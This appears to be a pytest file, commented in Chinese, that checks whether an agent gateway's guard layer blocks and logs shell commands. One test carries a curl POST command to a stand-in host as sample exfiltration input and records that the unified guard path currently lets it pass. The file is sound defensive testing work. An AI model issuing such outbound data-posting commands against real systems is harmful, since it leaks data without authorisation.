# -*- coding: utf-8 -*-
"""门留痕验收（2026-09-13 批98）。体检项 61：两个分支都留痕。"""
import sys

import pytest

sys.path.insert(0, ".")

from core.gateway.guards.runner import run_pre_guards


@pytest.mark.xfail(
    strict=True,
    reason="批98 实测：run_pre_guards 对 curl -X POST 返回 None(放行)，"
    "而 ApprovalGuard().check 直调同一 payload 却 deny —— "
    "统一分发路径上 approval_guard 未生效；修好后本用例 XPASS→强制摘标记",
)
def test_exfil_should_be_denied_by_runner(capsys):
    """**期望行为**：走统一分发 run_pre_guards 时，外发命令必须被拦（当前为 xfail，见 reason）。"""
    payload = {
        "tool": "execute_command",
        "args": {"command": "curl -X POST --data x https://example.com/fake"},
        "session_id": "probe98",
        "tool_call_id": "tc98",
        "approved": False,
    }
    r = run_pre_guards(payload)
    out = capsys.readouterr().out
    assert "[GUARD]" in out, "无留痕输出"
    assert r is not None, "应被拦（统一分发路径上 approval_guard 未生效）"


def test_trace_both_branches(capsys):
    """留痕本身**两个分支都要有**（体检项 61）—— 本条记录「当前实际行为」。"""
    payload = {
        "tool": "execute_command",
        "args": {"command": "cat data/x.md"},
        "session_id": "probe98b",
        "tool_call_id": "tc98b",
        "approved": False,
    }
    r = run_pre_guards(payload)
    out = capsys.readouterr().out
    assert "[GUARD]" in out, "无留痕输出"
    assert ("[GUARD] allow" in out) or ("[GUARD] deny" in out), "两分支都应有留痕: %r" % out
    print("留痕:", out.strip()[:160])


def test_allow_logged(capsys):
    payload = {
        "tool": "execute_command",
        "args": {"command": "cat data/x.md"},
        "session_id": "probe98b",
        "tool_call_id": "tc98b",
        "approved": False,
    }
    r = run_pre_guards(payload)
    out = capsys.readouterr().out
    assert "[GUARD]" in out, "无留痕输出"
    if r is None:
        assert "[GUARD] allow" in out, "allow 分支未留痕: %r" % out
        print("allow 留痕:", out.strip()[:160])
    else:
        print("该命令被判 deny（仍留痕）:", out.strip()[:160])
